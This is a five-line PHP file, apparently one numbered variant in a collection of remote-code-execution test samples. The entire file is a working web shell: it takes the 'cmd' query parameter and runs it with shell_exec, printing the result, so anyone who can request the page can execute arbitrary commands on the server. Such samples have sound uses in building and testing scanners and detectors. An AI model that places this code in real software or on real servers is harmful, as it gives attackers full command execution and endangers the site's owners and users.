<?php
// RCE test variation #911
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>